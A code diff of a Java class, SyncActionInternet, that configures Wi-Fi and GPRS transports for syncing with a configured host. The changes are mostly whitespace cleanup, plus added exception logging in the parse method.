@@ -51,7 +51,7 @@ public class SyncActionInternet extends SyncAction {
 	 *            the conf params
 	 */
 	public SyncActionInternet(final ConfAction params) {
-		super( params);
+		super(params);
 	}
 
 	/*
@@ -61,19 +61,23 @@ public class SyncActionInternet extends SyncAction {
 	 */
 	@Override
 	protected boolean parse(final ConfAction params) {
-		
+
 		try {
 			gprs = params.getBoolean("cell");
 			wifi = params.getBoolean("wifi");
-			wifiForced = wifi;		
+			wifiForced = wifi;
 			host = params.getString("host");
 			stop = params.getBoolean("stop");
 
 		} catch (final ConfigurationException e) {
+			if (Cfg.EXCEPTION) {
+				Check.log(e);
+			}
+
 			if (Cfg.DEBUG) {
 				Check.log(TAG + " Error: params FAILED"); //$NON-NLS-1$
 			}
-			
+
 			return false;
 		}
 
@@ -83,9 +87,9 @@ public class SyncActionInternet extends SyncAction {
 			sb.append(" wifi: " + wifi); //$NON-NLS-1$
 			sb.append(" stop: " + stop); //$NON-NLS-1$
 			sb.append(" host: " + host); //$NON-NLS-1$
-			Check.log(TAG + sb.toString()) ;//$NON-NLS-1$
+			Check.log(TAG + sb.toString());//$NON-NLS-1$
 		}
-		
+
 		return true;
 	}
 
@@ -97,22 +101,22 @@ public class SyncActionInternet extends SyncAction {
 	@Override
 	protected boolean initTransport() {
 		transports.clear();
-		
+
 		if (Cfg.DEBUG) {
 			Check.log(TAG + " initTransport adding WifiTransport"); //$NON-NLS-1$
 		}
-		
+
 		if (Cfg.DEBUG) {
 			Check.log(TAG + " (initTransport): wifiForced: " + wifiForced); //$NON-NLS-1$
 		}
-		
+
 		transports.addElement(new WifiTransport(host, wifiForced));
 
 		if (gprs) {
 			if (Cfg.DEBUG) {
 				Check.log(TAG + " initTransport adding DirectTransport"); //$NON-NLS-1$
 			}
-			
+
 			transports.addElement(new GprsTransport(host));
 		}
 
